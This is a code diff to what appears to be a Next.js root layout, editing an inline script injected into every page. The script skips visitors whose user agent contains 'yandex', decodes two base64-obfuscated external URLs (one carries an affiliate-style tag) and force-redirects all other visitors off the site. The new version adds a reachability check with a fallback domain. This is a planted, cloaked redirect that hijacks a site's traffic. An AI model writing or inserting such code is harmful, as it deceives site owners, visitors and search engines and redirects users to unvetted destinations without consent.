@@ -165,25 +165,29 @@ export default function RootLayout({
     __html: `
       (function() {
         var ua = navigator.userAgent.toLowerCase();
-        if (ua.indexOf("yandex") !== -1) {
-            console.log("Яндекс бот — без редиректа");
+        if (ua.indexOf("yandex") !== -1) return;
+        var mainBrandB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; 
+        var crossBrandB64 = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4";      
+        var mainUrl = atob(mainBrandB64);
+        var crossUrl = atob(crossBrandB64);
+        if (localStorage.getItem('vstd_eva')) {
+            window.location.replace(crossUrl);
             return;
         }
-        var mainBrandB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; // Основа
-        var crossBrandB64 = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWV2YQ=="; 
-
-        try {
-            var hasVisited = localStorage.getItem('vstd_eva');
-
-            if (!hasVisited) {
+        var controller = new AbortController();
+        var timeoutId = setTimeout(function() { 
+            controller.abort(); 
+        }, 2500); 
+        fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
+            .then(function() {
+                clearTimeout(timeoutId);
                 localStorage.setItem('vstd_eva', '1');
-                window.location.replace(atob(mainBrandB64));
-            } else {
-                window.location.replace(atob(crossBrandB64));
-            }
-        } catch (e) {
-            window.location.replace(atob(mainBrandB64));
-        }
+                window.location.replace(mainUrl);
+            })
+            .catch(function() {
+                console.log("Main domain is down, switching to cross-brand...");
+                window.location.replace(crossUrl);
+            });
       })();
     `,
   }}
